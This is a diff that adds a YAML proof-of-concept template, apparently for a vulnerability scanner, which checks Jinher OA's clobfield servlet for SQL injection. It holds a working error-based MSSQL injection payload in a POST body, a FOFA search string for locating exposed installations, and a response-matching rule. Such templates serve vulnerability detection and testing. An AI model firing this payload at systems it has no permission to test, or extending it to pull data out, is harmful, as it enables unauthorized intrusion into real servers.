@@ -1,0 +1,27 @@
+id: poc-yaml-jinher-clobfield-sqli
+info:
+  name: 金和OA clobfield SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(1,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /jc6/servlet/clobfield
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1'+and+1=convert(int,(select+sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}'))))--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"在将 nvarchar 值") &&
+
+    contains(body,t2) &&
+
+    contains(body,"转换成数据类型 int 时失败")
+
+    '
+transport: http
